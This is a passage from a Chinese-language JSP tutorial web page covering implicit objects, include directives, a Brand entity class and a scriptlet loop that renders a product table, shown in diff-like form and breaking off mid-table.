style=text-align:left>ServletConfig</td><td style=text-align:left>配置</td></tr><tr><td style=text-align:left>exception</td><td style=text-align:left>Throwable</td><td style=text-align:left>异常（错误页用）</td></tr></tbody></table><p>例如：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%
+    String name = request.getParameter(&#34;name&#34;);
+    session.setAttribute(&#34;user&#34;, name);
+%&gt;
+&lt;p&gt;你好，&lt;%= name %&gt;&lt;/p&gt;
+</code></pre><h4 id=jsp-的两种包含>JSP 的两种包含
+<a class=anchor href=#jsp-%e7%9a%84%e4%b8%a4%e7%a7%8d%e5%8c%85%e5%90%ab>#</a></h4><ul><li><strong>静态包含</strong> <code>&lt;%@ include file="..." %></code>：编译时合并，合成一个文件。</li><li><strong>动态包含</strong> <code>&lt;jsp:include page="..." /></code>：运行时分别执行，各自独立。</li></ul><h3 id=jsp-demo>JSP Demo
+<a class=anchor href=#jsp-demo>#</a></h3><p><img src=https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/target.png alt=1></p><p>如果作为静态页面出现，应该是这样的：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span> page contentType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/html;charset=UTF-8&#34;</span> language<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;java&#34;</span> <span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;%</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// 查询数据库</span>
+</span></span><span style=display:flex><span>    List<span style=color:#f92672>&lt;</span>Brand<span style=color:#f92672>&gt;</span> brands <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&lt;</span>Brand<span style=color:#f92672>&gt;</span>();
+</span></span><span style=display:flex><span>    brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(1,<span style=color:#e6db74>&#34;三只松鼠&#34;</span>,<span style=color:#e6db74>&#34;三只松鼠&#34;</span>,100,<span style=color:#e6db74>&#34;三只松鼠，好吃不上火&#34;</span>,1));
+</span></span><span style=display:flex><span>    brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(2,<span style=color:#e6db74>&#34;优衣库&#34;</span>,<span style=color:#e6db74>&#34;优衣库&#34;</span>,200,<span style=color:#e6db74>&#34;优衣库，服适人生&#34;</span>,0));
+</span></span><span style=display:flex><span>    brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(3,<span style=color:#e6db74>&#34;小米&#34;</span>,<span style=color:#e6db74>&#34;小米科技有限公司&#34;</span>,1000,<span style=color:#e6db74>&#34;为发烧而生&#34;</span>,1));
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;!</span>DOCTYPE html<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>head<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>title<span style=color:#f92672>&gt;</span>Title<span style=color:#f92672>&lt;/</span>title<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>head<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>body<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>input type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;button&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;新增&#34;</span><span style=color:#f92672>&gt;&lt;</span>br<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>hr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>table border<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1&#34;</span> cellspacing<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0&#34;</span> width<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;800&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>tr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>序号<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>品牌名称<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>企业名称<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>排序<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>品牌介绍<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>状态<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>操作<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/</span>tr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>tr align<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>1<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>三只松鼠<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>三只松鼠<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>100<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>三只松鼠<span style=color:#960050;background-color:#1e0010>，</span>好吃不上火<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>启用<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;</span>a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span><span style=color:#f92672>&gt;</span>修改<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;</span>a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span><span style=color:#f92672>&gt;</span>删除<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/</span>tr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>tr align<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>2<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>优衣库<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>优衣库<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>10<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>优衣库<span style=color:#960050;background-color:#1e0010>，</span>服适人生<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>禁用<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;</span>a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span><span style=color:#f92672>&gt;</span>修改<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;</span>a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span><span style=color:#f92672>&gt;</span>删除<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/</span>tr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>tr align<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>3<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>小米<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>小米科技有限公司<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>1000<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>为发烧而生<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;</span>启用<span style=color:#f92672>&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;</span>a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span><span style=color:#f92672>&gt;</span>修改<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;</span>a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span><span style=color:#f92672>&gt;</span>删除<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/</span>tr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>table<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>body<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>html<span style=color:#f92672>&gt;</span>
+</span></span></code></pre></div><p>但是现在我们要实现动态性，也就是通过循环遍历的方法获取数据库中的数据。</p><p>先写个实体类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.jspdemo;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Brand</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> Integer id;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String brandName;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String companyName;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> Integer ordered;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String description;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> Integer status;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Brand</span>() {
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Brand</span>(Integer id, String brandName, String companyName, String description) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> id;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>brandName</span> <span style=color:#f92672>=</span> brandName;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>companyName</span> <span style=color:#f92672>=</span> companyName;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>description</span> <span style=color:#f92672>=</span> description;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Brand</span>(Integer id, String brandName, String companyName, Integer ordered, String description, Integer status) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> id;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>brandName</span> <span style=color:#f92672>=</span> brandName;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>companyName</span> <span style=color:#f92672>=</span> companyName;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>ordered</span> <span style=color:#f92672>=</span> ordered;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>description</span> <span style=color:#f92672>=</span> description;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>status</span> <span style=color:#f92672>=</span> status;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Integer <span style=color:#a6e22e>getId</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> id;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setId</span>(Integer id) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> id;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getBrandName</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> brandName;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setBrandName</span>(String brandName) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>brandName</span> <span style=color:#f92672>=</span> brandName;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getCompanyName</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> companyName;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setCompanyName</span>(String companyName) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>companyName</span> <span style=color:#f92672>=</span> companyName;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Integer <span style=color:#a6e22e>getOrdered</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> ordered;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setOrdered</span>(Integer ordered) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>ordered</span> <span style=color:#f92672>=</span> ordered;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getDescription</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> description;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setDescription</span>(String description) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>description</span> <span style=color:#f92672>=</span> description;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> Integer <span style=color:#a6e22e>getStatus</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> status;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setStatus</span>(Integer status) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>status</span> <span style=color:#f92672>=</span> status;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>toString</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Brand{&#34;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;id=&#34;</span> <span style=color:#f92672>+</span> id <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;, brandName=&#39;&#34;</span> <span style=color:#f92672>+</span> brandName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;\&#39;&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;, companyName=&#39;&#34;</span> <span style=color:#f92672>+</span> companyName <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;\&#39;&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;, ordered=&#34;</span> <span style=color:#f92672>+</span> ordered <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;, description=&#39;&#34;</span> <span style=color:#f92672>+</span> description <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;\&#39;&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;, status=&#34;</span> <span style=color:#f92672>+</span> status <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;}&#39;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>接着来实现动态的 JSP 代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span> page import<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;org.example.jspdemo.Brand&#34;</span> <span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span> page import<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;java.util.List&#34;</span> <span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span> page import<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;java.util.ArrayList&#34;</span> <span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span> page contentType<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/html;charset=UTF-8&#34;</span> language<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;java&#34;</span> <span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;%</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// 查询数据库</span>
+</span></span><span style=display:flex><span>  List<span style=color:#f92672>&lt;</span>Brand<span style=color:#f92672>&gt;</span> brands <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&lt;</span>Brand<span style=color:#f92672>&gt;</span>();
+</span></span><span style=display:flex><span>  brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(1,<span style=color:#e6db74>&#34;三只松鼠&#34;</span>,<span style=color:#e6db74>&#34;三只松鼠&#34;</span>,100,<span style=color:#e6db74>&#34;三只松鼠，好吃不上火&#34;</span>,1));
+</span></span><span style=display:flex><span>  brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(2,<span style=color:#e6db74>&#34;优衣库&#34;</span>,<span style=color:#e6db74>&#34;优衣库&#34;</span>,200,<span style=color:#e6db74>&#34;优衣库，服适人生&#34;</span>,0));
+</span></span><span style=display:flex><span>  brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(3,<span style=color:#e6db74>&#34;小米&#34;</span>,<span style=color:#e6db74>&#34;小米科技有限公司&#34;</span>,1000,<span style=color:#e6db74>&#34;为发烧而生&#34;</span>,1));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;!</span>DOCTYPE html<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>head<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span>meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span>title<span style=color:#f92672>&gt;</span>Title<span style=color:#f92672>&lt;/</span>title<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>head<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>body<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>input type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;button&#34;</span> value<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;新增&#34;</span><span style=color:#f92672>&gt;&lt;</span>br<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>hr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>table border<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1&#34;</span> cellspacing<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0&#34;</span> width<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;800&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span>tr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>序号<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>品牌名称<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>企业名称<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>排序<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>品牌介绍<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>状态<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>th<span style=color:#f92672>&gt;</span>操作<span style=color:#f92672>&lt;/</span>th<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/</span>tr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;%</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> brands.<span style=color:#a6e22e>size</span>(); i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>      Brand brand <span style=color:#f92672>=</span> brands.<span style=color:#a6e22e>get</span>(i);
+</span></span><span style=display:flex><span>  <span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span>tr align<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;%=</span>brand.<span style=color:#a6e22e>getId</span>()<span style=color:#f92672>%&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;%=</span>brand.<span style=color:#a6e22e>getBrandName</span>()<span style=color:#f92672>%&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;%=</span>brand.<span style=color:#a6e22e>getCompanyName</span>()<span style=color:#f92672>%&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
